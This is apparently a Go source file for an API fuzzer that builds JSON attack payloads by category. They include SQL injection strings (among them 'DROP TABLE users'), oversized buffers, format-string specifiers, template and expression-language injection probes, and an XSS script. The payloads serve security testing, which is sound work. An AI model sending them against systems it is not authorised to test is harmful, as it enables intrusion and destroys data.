package fuzzer

import "fmt"

// 카테고리별 공격 페이로드 생성
func GeneratePayloads(category string) []string {
    switch category {
    case "sql_injection":
        return sqlInjectionPayloads()
    case "overflow":
        return overflowPayloads()
    case "format_string":
        return formatStringPayloads()
    case "all":
        all := []string{}
        all = append(all, sqlInjectionPayloads()...)
        all = append(all, overflowPayloads()...)
        all = append(all, formatStringPayloads()...)
        return all
    default:
        return basicPayloads()
    }
}

func sqlInjectionPayloads() []string {
    return []string{
        `{"id": "1' OR '1'='1"}`,
        `{"id": "1; DROP TABLE users;--"}`,
        `{"name": "' UNION SELECT * FROM users--"}`,
        `{"query": "1' AND SLEEP(5)--"}`,
    }
}

func overflowPayloads() []string {
    // 다양한 크기의 버퍼 오버플로우 시도
    payloads := []string{}
    for _, size := range []int{100, 1000, 10000, 100000} {
        large := make([]byte, size)
        for i := range large {
            large[i] = 'A'
        }
        payloads = append(payloads,
            fmt.Sprintf(`{"data": "%s"}`, string(large)))
    }
    return payloads
}

func formatStringPayloads() []string {
    return []string{
        `{"name": "%s%s%s%s%s"}`,
        `{"input": "%x%x%x%x"}`,
        `{"value": "{{7*7}}"}`,          // template injection
        `{"value": "${7*7}"}`,           // EL injection
        `{"value": "<script>alert(1)</script>"}`, // XSS
    }
}

func basicPayloads() []string {
    return []string{
        `{}`,
        `null`,
        `{"key": null}`,
        `{"num": -1}`,
        `{"num": 99999999999}`,
    }
}